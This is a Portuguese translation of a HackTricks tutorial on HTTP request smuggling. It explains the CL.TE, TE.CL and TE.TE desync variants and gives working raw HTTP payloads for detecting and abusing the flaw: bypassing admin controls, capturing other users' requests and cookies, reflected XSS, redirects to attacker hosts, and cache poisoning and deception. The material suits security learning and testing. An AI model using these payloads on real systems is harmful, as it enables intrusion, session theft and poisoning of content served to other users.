# HTTP Request Smuggling / Ataque de Desincroniza√ß√£o HTTP

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas dicas de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## O que √©

Essa vulnerabilidade ocorre quando uma **desincroniza√ß√£o** entre **proxies de front-end** e o **servidor back-end** permite que um **atacante** **envie** uma **requisi√ß√£o HTTP** que ser√° **interpretada** como uma **√∫nica requisi√ß√£o** pelos **proxies de front-end** (balanceador de carga/proxy reverso) e **como 2 requisi√ß√µes** pelo **servidor back-end**.\
Isso permite que um usu√°rio **modifique a pr√≥xima requisi√ß√£o que chega ao servidor back-end depois da dele**.

### Teoria

[Especifica√ß√£o RFC (2161)](https://tools.ietf.org/html/rfc2616)

> Se uma mensagem for recebida com um campo de cabe√ßalho Transfer-Encoding e um campo de cabe√ßalho Content-Length, este √∫ltimo DEVE ser ignorado.

**Content-Length**

> O cabe√ßalho de entidade Content-Length indica o tamanho do corpo da entidade, em bytes, enviado ao destinat√°rio.

**Transfer-Encoding: chunked**

> O cabe√ßalho Transfer-Encoding especifica a forma de codifica√ß√£o usada para transferir com seguran√ßa o corpo da carga √∫til para o usu√°rio.\
> Chunked significa que dados grandes s√£o enviados em uma s√©rie de chunks.

### Realidade

O **Front-End** (um balanceador de carga / Proxy Reverso) **processa** o cabe√ßalho _**content-length**_ ou o cabe√ßalho _**transfer-encoding**_ e o **servidor Back-End** **processa o outro** provocando uma **desincroniza√ß√£o** entre os 2 sistemas.\
Isso pode ser muito cr√≠tico, pois **um atacante poder√° enviar uma requisi√ß√£o** para o proxy reverso que ser√° **interpretada** pelo **servidor back-end como 2 requisi√ß√µes diferentes**. O **perigo** dessa t√©cnica reside no fato de que o **servidor back-end interpretar√° a 2¬™ requisi√ß√£o injetada** como se ela **viesse do pr√≥ximo cliente** e a **requisi√ß√£o real** desse cliente far√° **parte** da **requisi√ß√£o injetada**.

### Particularidades

Lembre-se de que no HTTP **um caractere de nova linha √© composto por 2 bytes:**

* **Content-Length**: Esse cabe√ßalho usa um **n√∫mero decimal** para indicar o **n√∫mero** de **bytes** do **corpo** da requisi√ß√£o. O corpo √© esperado para terminar no √∫ltimo caractere, **uma nova linha n√£o √© necess√°ria no final da requisi√ß√£o**.
* **Transfer-Encoding:** Esse cabe√ßalho usa no **corpo** um **n√∫mero hexadecimal** para indicar o **n√∫mero** de **bytes** do **pr√≥ximo chunk**. O **chunk** deve **terminar** com uma **nova linha**, mas essa nova linha **n√£o √© contada** pelo indicador de comprimento. Esse m√©todo de transfer√™ncia deve terminar com um **chunk de tamanho 0 seguido por 2 novas linhas**: `0`
* **Connection**: Com base em minha experi√™ncia, √© recomendado usar **`Connection: keep-alive`** na primeira requisi√ß√£o do Request Smuggling.

## Exemplos B√°sicos

{% hint style="success" %}
Ao tentar explorar isso com o Burp Suite, **desative `Update Content-Length` e `Normalize HTTP/1 line endings`** no repeater porque alguns gadgets abusam de novas linhas, retornos de carro e comprimentos de conte√∫do malformados.
{% endhint %}

Os ataques de desincroniza√ß√£o de requisi√ß√£o HTTP s√£o elaborados enviando requisi√ß√µes amb√≠guas que exploram discrep√¢ncias na forma como os servidores de front-end e back-end interpretam os cabe√ßalhos `Content-Length` (CL) e `Transfer-Encoding` (TE). Esses ataques podem se manifestar de diferentes formas, principalmente como **CL.TE**, **TE.CL** e **TE.TE**. Cada tipo representa uma combina√ß√£o √∫nica de como os servidores de front-end e back-end priorizam esses cabe√ßalhos. As vulnerabilidades surgem do processamento das mesmas requisi√ß√µes pelos servidores de maneiras diferentes, levando a resultados inesperados e potencialmente maliciosos.

### Exemplos B√°sicos de Tipos de Vulnerabilidades

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Vulnerabilidade CL.TE (Content-Length usado pelo Front-End, Transfer-Encoding usado pelo Back-End)

* **Front-End (CL):** Processa a requisi√ß√£o com base no cabe√ßalho `Content-Length`.
* **Back-End (TE):** Processa a requisi√ß√£o com base no cabe√ßalho `Transfer-Encoding`.
* **Cen√°rio de Ataque:**
* O atacante envia uma requisi√ß√£o em que o valor do cabe√ßalho `Content-Length` n√£o corresponde ao comprimento real do conte√∫do.
* O servidor de front-end encaminha a requisi√ß√£o inteira para o back-end, com base no valor de `Content-Length`.
* O servidor back-end processa a requisi√ß√£o como chunked devido ao cabe√ßalho `Transfer-Encoding: chunked`, interpretando os dados restantes como uma requisi√ß√£o separada e subsequente.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Vulnerabilidade TE.CL (Transfer-Encoding usado pelo Front-End, Content-Length usado pelo Back-End)

* **Front-End (TE):** Processa a requisi√ß√£o com base no cabe√ßalho `Transfer-Encoding`.
* **Back-End (CL):** Processa a requisi√ß√£o com base no cabe√ßalho `Content-Length`.
* **Cen√°rio de Ataque:**
* O atacante envia uma requisi√ß√£o chunked em que o tamanho do chunk (`7b`) e o comprimento real do conte√∫do (`Content-Length: 4`) n√£o se alinham.
* O servidor de front-end, respeitando `Transfer-Encoding`, encaminha a requisi√ß√£o inteira para o back-end.
* O servidor back-end, respeitando `Content-Length`, processa apenas a parte inicial da requisi√ß√£o (`7b` bytes), deixando o restante como parte de uma subsequente requisi√ß√£o n√£o intencional.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### Vulnerabilidade TE.TE (Transfer-Encoding usado por ambos, com obfusca√ß√£o)

* **Servidores:** Ambos suportam `Transfer-Encoding`, mas um pode ser enganado para ignor√°-lo por meio de obfusca√ß√£o.
* **Cen√°rio de Ataque:**
* O atacante envia uma solicita√ß√£o com cabe√ßalhos de `Transfer-Encoding` obfuscados.
* Dependendo de qual servidor (front-end ou back-end) falha em reconhecer a obfusca√ß√£o, uma vulnerabilidade CL.TE ou TE.CL pode ser explorada.
* A parte n√£o processada da solicita√ß√£o, conforme vista por um dos servidores, torna-se parte de uma solicita√ß√£o subsequente, levando ao contrabando.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Cen√°rio CL.CL (Content-Length usado por ambos Front-End e Back-End):**

* Ambos os servidores processam a solicita√ß√£o com base exclusivamente no cabe√ßalho `Content-Length`.
* Este cen√°rio normalmente n√£o leva ao contrabando, pois h√° alinhamento na forma como ambos os servidores interpretam o comprimento da solicita√ß√£o.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Solicita√ß√£o Normal
```

#### **Cen√°rio CL != 0:**

* Refere-se a cen√°rios em que o cabe√ßalho `Content-Length` est√° presente e tem um valor diferente de zero, indicando que o corpo da solicita√ß√£o cont√©m conte√∫do.
* √â crucial para entender e elaborar ataques de contrabando, pois influencia como os servidores determinam o final de uma solicita√ß√£o.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Corpo N√£o Vazio
```

#### Quebrando o servidor web

Essa t√©cnica tamb√©m √© √∫til em cen√°rios onde √© poss√≠vel **quebrar um servidor web ao ler os dados HTTP iniciais** mas **sem fechar a conex√£o**. Dessa forma, o **corpo** da solicita√ß√£o HTTP ser√° considerado a **pr√≥xima solicita√ß√£o HTTP**.

Por exemplo, como explicado neste [**artigo**](https://mizu.re/post/twisty-python), no Werkzeug era poss√≠vel enviar alguns caracteres **Unicode** e fazer o servidor **quebrar**. No entanto, se a conex√£o HTTP foi criada com o cabe√ßalho **`Connection: keep-alive`**, o corpo da solicita√ß√£o n√£o ser√° lido e a conex√£o ainda estar√° aberta, ent√£o o **corpo** da solicita√ß√£o ser√° tratado como a **pr√≥xima solicita√ß√£o HTTP**.

#### For√ßando via cabe√ßalhos hop-by-hop

Abusando dos cabe√ßalhos hop-by-hop, voc√™ poderia indicar ao proxy para **excluir o cabe√ßalho Content-Length ou Transfer-Encoding para que um contrabando de solicita√ß√£o HTTP seja poss√≠vel de ser abusado**.
```
Connection: Content-Length
```
Para **mais informa√ß√µes sobre cabe√ßalhos hop-by-hop** visite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Encontrando HTTP Request Smuggling

A identifica√ß√£o de vulnerabilidades de HTTP request smuggling pode frequentemente ser alcan√ßada usando t√©cnicas de temporiza√ß√£o, que dependem de observar quanto tempo o servidor leva para responder a solicita√ß√µes manipuladas. Essas t√©cnicas s√£o particularmente √∫teis para detectar vulnerabilidades CL.TE e TE.CL. Al√©m desses m√©todos, existem outras estrat√©gias e ferramentas que podem ser usadas para encontrar tais vulnerabilidades:

### Encontrando Vulnerabilidades CL.TE Usando T√©cnicas de Temporiza√ß√£o

* **M√©todo:**
* Enviar uma solicita√ß√£o que, se a aplica√ß√£o for vulner√°vel, far√° com que o servidor back-end espere por dados adicionais.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Observa√ß√£o:**
* O servidor front-end processa a solicita√ß√£o com base no `Content-Length` e interrompe a mensagem prematuramente.
* O servidor back-end, esperando uma mensagem segmentada, aguarda o pr√≥ximo segmento que nunca chega, causando um atraso.
* **Indicadores:**
* Timeouts ou longos atrasos na resposta.
* Receber um erro 400 Bad Request do servidor back-end, √†s vezes com informa√ß√µes detalhadas do servidor.

### Encontrando Vulnerabilidades TE.CL Usando T√©cnicas de Temporiza√ß√£o

* **M√©todo:**
* Enviar uma solicita√ß√£o que, se a aplica√ß√£o for vulner√°vel, far√° com que o servidor back-end espere por dados adicionais.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Observa√ß√£o:**
* O servidor front-end processa a solicita√ß√£o com base no `Transfer-Encoding` e encaminha a mensagem inteira.
* O servidor back-end, esperando uma mensagem com base no `Content-Length`, aguarda dados adicionais que nunca chegam, causando um atraso.

### Outros M√©todos para Encontrar Vulnerabilidades

* **An√°lise Diferencial de Resposta:**
* Enviar vers√µes ligeiramente variadas de uma solicita√ß√£o e observar se as respostas do servidor diferem de maneira inesperada, indicando uma discrep√¢ncia de an√°lise.
* **Usando Ferramentas Automatizadas:**
* Ferramentas como a extens√£o 'HTTP Request Smuggler' do Burp Suite podem testar automaticamente essas vulnerabilidades enviando v√°rias formas de solicita√ß√µes amb√≠guas e analisando as respostas.
* **Testes de Varia√ß√£o de Content-Length:**
* Enviar solicita√ß√µes com valores de `Content-Length` variados que n√£o est√£o alinhados com o comprimento real do conte√∫do e observar como o servidor lida com tais discrep√¢ncias.
* **Testes de Varia√ß√£o de Transfer-Encoding:**
* Enviar solicita√ß√µes com cabe√ßalhos de `Transfer-Encoding` obfuscados ou malformados e monitorar como os servidores front-end e back-end respondem de maneira diferente a essas manipula√ß√µes.

### Testando a Vulnerabilidade de HTTP Request Smuggling

Ap√≥s confirmar a efic√°cia das t√©cnicas de temporiza√ß√£o, √© crucial verificar se as solicita√ß√µes do cliente podem ser manipuladas. Um m√©todo direto √© tentar envenenar suas solicita√ß√µes, por exemplo, fazendo com que uma solicita√ß√£o para `/` resulte em uma resposta 404. Os exemplos `CL.TE` e `TE.CL` discutidos anteriormente em [Exemplos B√°sicos](./#basic-examples) demonstram como envenenar uma solicita√ß√£o do cliente para obter uma resposta 404, apesar do cliente tentar acessar um recurso diferente.

**Considera√ß√µes Importantes**

Ao testar vulnerabilidades de request smuggling interferindo em outras solicita√ß√µes, tenha em mente:

* **Conex√µes de Rede Distintas:** As solicita√ß√µes "de ataque" e "normais" devem ser enviadas por conex√µes de rede separadas. Utilizar a mesma conex√£o para ambas n√£o valida a presen√ßa da vulnerabilidade.
* **URL e Par√¢metros Consistentes:** Procure usar URLs e nomes de par√¢metros id√™nticos para ambas as solicita√ß√µes. Aplica√ß√µes modernas frequentemente roteiam solicita√ß√µes para servidores back-end espec√≠ficos com base em URL e par√¢metros. Correspondendo a esses aumenta a probabilidade de que ambas as solicita√ß√µes sejam processadas pelo mesmo servidor, um requisito para um ataque bem-sucedido.
* **Temporiza√ß√£o e Condi√ß√µes de Corrida:** A solicita√ß√£o "normal", destinada a detectar interfer√™ncia da solicita√ß√£o "de ataque", compete contra outras solicita√ß√µes concorrentes da aplica√ß√£o. Portanto, envie a solicita√ß√£o "normal" imediatamente ap√≥s a solicita√ß√£o "de ataque". Aplica√ß√µes ocupadas podem exigir m√∫ltiplas tentativas para confirmar a vulnerabilidade de forma conclusiva.
* **Desafios de Balanceamento de Carga:** Servidores front-end atuando como balanceadores de carga podem distribuir solicita√ß√µes entre v√°rios sistemas back-end. Se as solicita√ß√µes "de ataque" e "normais" acabarem em sistemas diferentes, o ataque n√£o ter√° sucesso. Este aspecto de balanceamento de carga pode exigir v√°rias tentativas para confirmar uma vulnerabilidade.
* **Impacto N√£o Intencional no Usu√°rio:** Se seu ataque impactar inadvertidamente a solicita√ß√£o de outro usu√°rio (n√£o a solicita√ß√£o "normal" que voc√™ enviou para detec√ß√£o), isso indica que seu ataque influenciou outro usu√°rio da aplica√ß√£o. Testes cont√≠nuos podem perturbar outros usu√°rios, exigindo uma abordagem cautelosa.

## Abusando do HTTP Request Smuggling

### Contornando a Seguran√ßa Front-End via HTTP Request Smuggling

√Äs vezes, proxies front-end aplicam medidas de seguran√ßa, analisando as solicita√ß√µes recebidas. No entanto, essas medidas podem ser contornadas explorando o HTTP Request Smuggling, permitindo acesso n√£o autorizado a endpoints restritos. Por exemplo, acessar `/admin` pode ser proibido externamente, com o proxy front-end bloqueando ativamente tais tentativas. No entanto, esse proxy pode negligenciar a inspe√ß√£o de solicita√ß√µes incorporadas dentro de uma solicita√ß√£o HTTP contrabandeada, deixando uma brecha para contornar essas restri√ß√µes.

Considere os exemplos a seguir ilustrando como o HTTP Request Smuggling pode ser usado para contornar controles de seguran√ßa front-end, visando especificamente o caminho `/admin` que geralmente √© protegido pelo proxy front-end:

**Exemplo CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
No ataque CL.TE, o cabe√ßalho `Content-Length` √© aproveitado para a requisi√ß√£o inicial, enquanto a requisi√ß√£o incorporada subsequente utiliza o cabe√ßalho `Transfer-Encoding: chunked`. O proxy de front-end processa a requisi√ß√£o `POST` inicial, mas falha em inspecionar a requisi√ß√£o `GET /admin` incorporada, permitindo acesso n√£o autorizado ao caminho `/admin`.

**Exemplo TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Por outro lado, no ataque TE.CL, o pedido `POST` inicial usa `Transfer-Encoding: chunked`, e o pedido incorporado subsequente √© processado com base no cabe√ßalho `Content-Length`. Semelhante ao ataque CL.TE, o proxy de front-end ignora o pedido `GET /admin` contrabandeado, concedendo inadvertidamente acesso ao caminho restrito `/admin`.

### Revelando a reescrita de pedido de front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

As aplica√ß√µes frequentemente empregam um **servidor de front-end** para modificar os pedidos recebidos antes de envi√°-los ao servidor de back-end. Uma modifica√ß√£o t√≠pica envolve adicionar cabe√ßalhos, como `X-Forwarded-For: <IP do cliente>`, para transmitir o IP do cliente ao back-end. Compreender essas modifica√ß√µes pode ser crucial, pois pode revelar maneiras de **burlar prote√ß√µes** ou **descobrir informa√ß√µes ou endpoints ocultos**.

Para investigar como um proxy altera um pedido, localize um par√¢metro POST que o back-end ecoa na resposta. Em seguida, crie um pedido, usando este par√¢metro por √∫ltimo, semelhante ao seguinte:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Nesta estrutura, os componentes de solicita√ß√£o subsequentes s√£o anexados ap√≥s `search=`, que √© o par√¢metro refletido na resposta. Essa reflex√£o expor√° os cabe√ßalhos da solicita√ß√£o subsequente.

√â importante alinhar o cabe√ßalho `Content-Length` da solicita√ß√£o aninhada com o comprimento real do conte√∫do. Come√ßar com um valor pequeno e incrementar gradualmente √© aconselh√°vel, pois um valor muito baixo truncar√° os dados refletidos, enquanto um valor muito alto pode fazer com que a solicita√ß√£o apresente erro.

Essa t√©cnica tamb√©m √© aplic√°vel no contexto de uma vulnerabilidade TE.CL, mas a solicita√ß√£o deve terminar com `search=\r\n0`. Independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.

Este m√©todo serve principalmente para entender as modifica√ß√µes de solicita√ß√£o feitas pelo proxy de front-end, essencialmente realizando uma investiga√ß√£o autodirigida.

### Capturando solicita√ß√µes de outros usu√°rios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

√â vi√°vel capturar as solicita√ß√µes do pr√≥ximo usu√°rio anexando uma solicita√ß√£o espec√≠fica como o valor de um par√¢metro durante uma opera√ß√£o POST. Veja como isso pode ser feito:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Neste cen√°rio, o **par√¢metro de coment√°rio** destina-se a armazenar o conte√∫do dentro da se√ß√£o de coment√°rios de uma postagem em uma p√°gina de acesso p√∫blico. Consequentemente, o conte√∫do da solicita√ß√£o subsequente aparecer√° como um coment√°rio.

No entanto, essa t√©cnica tem limita√ß√µes. Geralmente, ela captura dados apenas at√© o delimitador de par√¢metro usado na solicita√ß√£o contrabandeada. Para envios de formul√°rios codificados em URL, esse delimitador √© o caractere `&`. Isso significa que o conte√∫do capturado da solicita√ß√£o do usu√°rio v√≠tima ser√° interrompido no primeiro `&`, que pode at√© fazer parte da string de consulta.

Al√©m disso, vale ressaltar que essa abordagem tamb√©m √© vi√°vel com uma vulnerabilidade TE.CL. Em tais casos, a solicita√ß√£o deve ser conclu√≠da com `search=\r\n0`. Independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.

### Usando contrabando de solicita√ß√£o HTTP para explorar XSS refletido

O Contrabando de Solicita√ß√£o HTTP pode ser aproveitado para explorar p√°ginas da web vulner√°veis a **XSS Refletido**, oferecendo vantagens significativas:

* A intera√ß√£o com os usu√°rios-alvo **n√£o √© necess√°ria**.
* Permite a explora√ß√£o de XSS em partes da solicita√ß√£o que s√£o **normalmente inating√≠veis**, como os cabe√ßalhos de solicita√ß√£o HTTP.

Em cen√°rios em que um site √© suscet√≠vel a XSS Refletido por meio do cabe√ßalho User-Agent, a carga √∫til a seguir demonstra como explorar essa vulnerabilidade:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Este payload √© estruturado para explorar a vulnerabilidade atrav√©s de:

1. Iniciar uma solicita√ß√£o `POST`, aparentemente t√≠pica, com um cabe√ßalho `Transfer-Encoding: chunked` para indicar o in√≠cio do smuggling.
2. Seguir com um `0`, marcando o final do corpo da mensagem chunked.
3. Em seguida, √© introduzida uma solicita√ß√£o `GET` contrabandeada, onde o cabe√ßalho `User-Agent` √© injetado com um script, `<script>alert(1)</script>`, acionando o XSS quando o servidor processa essa solicita√ß√£o subsequente.

Ao manipular o `User-Agent` atrav√©s do smuggling, o payload contorna as restri√ß√µes normais da solicita√ß√£o, explorando assim a vulnerabilidade de XSS Refletido de uma maneira n√£o padr√£o, mas eficaz.

#### HTTP/0.9

{% hint style="danger" %}
No caso em que o conte√∫do do usu√°rio √© refletido em uma resposta com um **`Content-type`** como **`text/plain`**, impedindo a execu√ß√£o do XSS. Se o servidor suportar **HTTP/0.9, pode ser poss√≠vel contornar isso**!
{% endhint %}

A vers√£o HTTP/0.9 foi anterior √† 1.0 e usa apenas verbos **GET** e **n√£o** responde com **cabe√ßalhos**, apenas o corpo.

Neste [**artigo**](https://mizu.re/post/twisty-python), isso foi abusado com um smuggling de solicita√ß√£o e um **ponto final vulner√°vel que responder√° com a entrada do usu√°rio** para contrabandear uma solicita√ß√£o com HTTP/0.9. O par√¢metro que ser√° refletido na resposta continha uma **resposta falsa HTTP/1.1 (com cabe√ßalhos e corpo)**, ent√£o a resposta conter√° c√≥digo JS execut√°vel v√°lido com um `Content-Type` de `text/html`.

### Explorando Redirecionamentos no Local com HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

As aplica√ß√µes frequentemente redirecionam de uma URL para outra usando o nome do host do cabe√ßalho `Host` na URL de redirecionamento. Isso √© comum em servidores web como Apache e IIS. Por exemplo, solicitar uma pasta sem uma barra final resulta em um redirecionamento para incluir a barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Resultados em:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Embora aparentemente inofensivo, esse comportamento pode ser manipulado usando o contrabando de solicita√ß√µes HTTP para redirecionar usu√°rios para um site externo. Por exemplo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Esta solicita√ß√£o contrabandeada poderia fazer com que a pr√≥xima solicita√ß√£o de usu√°rio processada seja redirecionada para um site controlado pelo atacante:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Resultados em:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Neste cen√°rio, a solicita√ß√£o de um usu√°rio para um arquivo JavaScript √© sequestrada. O atacante pode potencialmente comprometer o usu√°rio servindo JavaScript malicioso em resposta.

### Explorando a Polui√ß√£o de Cache Web via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

A polui√ß√£o de cache web pode ser executada se algum componente da **infraestrutura de front-end armazenar em cache conte√∫do**, tipicamente para melhorar o desempenho. Ao manipular a resposta do servidor, √© poss√≠vel **poluir o cache**.

Anteriormente, observamos como as respostas do servidor poderiam ser alteradas para retornar um erro 404 (consulte [Exemplos B√°sicos](./#basic-examples)). Da mesma forma, √© vi√°vel enganar o servidor para entregar o conte√∫do `/index.html` em resposta a uma solicita√ß√£o para `/static/include.js`. Consequentemente, o conte√∫do `/static/include.js` √© substitu√≠do no cache pelo de `/index.html`, tornando o `/static/include.js` inacess√≠vel aos usu√°rios, potencialmente levando a uma Nega√ß√£o de Servi√ßo (DoS).

Essa t√©cnica se torna particularmente potente se uma **vulnerabilidade de Redirecionamento Aberto** for descoberta ou se houver um **redirecionamento no local para um redirecionamento aberto**. Tais vulnerabilidades podem ser exploradas para substituir o conte√∫do em cache de `/static/include.js` por um script sob o controle do atacante, essencialmente permitindo um ataque generalizado de Cross-Site Scripting (XSS) contra todos os clientes que solicitam o `/static/include.js` atualizado.

Abaixo est√° uma ilustra√ß√£o da explora√ß√£o da **polui√ß√£o de cache combinada com um redirecionamento no local para um redirecionamento aberto**. O objetivo √© alterar o conte√∫do em cache de `/static/include.js` para servir c√≥digo JavaScript controlado pelo atacante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Observe o pedido incorporado direcionado para `/post/next?postId=3`. Este pedido ser√° redirecionado para `/post?postId=4`, utilizando o **valor do cabe√ßalho Host** para determinar o dom√≠nio. Ao alterar o **cabe√ßalho Host**, o atacante pode redirecionar o pedido para seu dom√≠nio (**redirecionamento no local para redirecionamento aberto**).

Ap√≥s o **envenenamento de soquete** bem-sucedido, um **pedido GET** para `/static/include.js` deve ser iniciado. Este pedido ser√° contaminado pelo pedido anterior de **redirecionamento no local para redirecionamento aberto** e buscar√° o conte√∫do do script controlado pelo atacante.

Posteriormente, qualquer pedido para `/static/include.js` servir√° o conte√∫do em cache do script do atacante, lan√ßando efetivamente um amplo ataque XSS.

### Usando o contrabando de pedido HTTP para realizar a decep√ß√£o de cache da web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Qual √© a diferen√ßa entre envenenamento de cache da web e decep√ß√£o de cache da web?**
>
> * No **envenenamento de cache da web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do malicioso no cache, e esse conte√∫do √© servido a partir do cache para outros usu√°rios da aplica√ß√£o.
> * Na **decep√ß√£o de cache da web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do sens√≠vel pertencente a outro usu√°rio no cache, e o atacante ent√£o recupera esse conte√∫do do cache.

O atacante elabora um pedido contrabandeado que busca conte√∫do sens√≠vel espec√≠fico do usu√°rio. Considere o exemplo a seguir:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Se esta solicita√ß√£o contrabandeada envenenar um registro de cache destinado a conte√∫do est√°tico (por exemplo, `/someimage.png`), os dados sens√≠veis da v√≠tima de `/private/messages` podem ser armazenados em cache sob o registro de cache do conte√∫do est√°tico. Consequentemente, o atacante poderia potencialmente recuperar esses dados sens√≠veis armazenados em cache.

### Abusando do TRACE via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**Neste post**](https://portswigger.net/research/trace-desync-attack) √© sugerido que se o servidor tiver o m√©todo TRACE habilitado, poderia ser poss√≠vel abusar dele com um HTTP Request Smuggling. Isso ocorre porque esse m√©todo refletir√° qualquer cabe√ßalho enviado para o servidor como parte do corpo da resposta. Por exemplo:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Ir√° enviar uma resposta como:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
